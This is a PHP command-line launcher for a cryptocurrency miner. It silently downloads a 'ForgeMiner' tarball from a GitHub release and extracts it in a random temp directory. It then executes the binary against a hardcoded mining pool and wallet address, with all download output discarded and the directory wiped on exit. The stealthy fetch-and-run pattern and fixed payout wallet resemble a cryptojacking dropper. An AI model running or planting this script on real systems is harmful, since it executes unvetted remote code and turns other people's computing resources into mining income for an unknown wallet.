#!/usr/bin/env php
<?php

$URL     = "https://github.com/0xHashRaptor/ForgeMiner/releases/download/v1.3.0/ForgeMiner-1.3.0-linux.tar.gz";
$TARBALL = "ForgeMiner-1.3.0-linux.tar.gz";
$ALGO    = "pearlhash";
$POOL    = "prl.kryptex.network:7048";
$WALLET  = "prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t";

$options = [
    'algo'   => $ALGO,
    'pool'   => $POOL,
    'wallet' => $WALLET,
    'url'    => $URL,
    'extra'  => [],
];

$opts = getopt("h", ["algo:", "pool:", "wallet:", "url:", "help"]);

if (isset($opts['h']) || isset($opts['help'])) {
    exit(0);
}

if (isset($opts['algo']))   $options['algo']   = $opts['algo'];
if (isset($opts['pool']))   $options['pool']   = $opts['pool'];
if (isset($opts['wallet'])) $options['wallet'] = $opts['wallet'];
if (isset($opts['url']))    $options['url']    = $opts['url'];

$separator = array_search('--', $argv);
if ($separator !== false) {
    $options['extra'] = array_slice($argv, $separator + 1);
}

$workdir = sys_get_temp_dir() . '/forge-' . bin2hex(random_bytes(4));
mkdir($workdir, 0755, true);

function cleanup($dir) {
    if (!is_dir($dir)) return;
    $it = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
    $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ($files as $file) {
        $file->isDir() ? rmdir($file->getRealPath()) : unlink($file->getRealPath());
    }
    rmdir($dir);
}

register_shutdown_function(function () use ($workdir) {
    cleanup($workdir);
});

pcntl_signal(SIGINT,  function () use ($workdir) { cleanup($workdir); exit(130); });
pcntl_signal(SIGTERM, function () use ($workdir) { cleanup($workdir); exit(143); });

chdir($workdir);

$null = '/dev/null';

system(sprintf(
    'curl -fsSL -o %s %s >%s 2>%s',
    escapeshellarg($TARBALL),
    escapeshellarg($options['url']),
    $null, $null
));

system(sprintf('tar xzf %s >%s 2>%s', escapeshellarg($TARBALL), $null, $null));

if (file_exists('forge')) {
    chmod('forge', 0755);
}

$cmd = array_merge(
    ['./forge', '--algorithm', $options['algo'], '--pool', $options['pool'], '--wallet', $options['wallet']],
    $options['extra']
);

pcntl_exec($cmd[0], array_slice($cmd, 1));
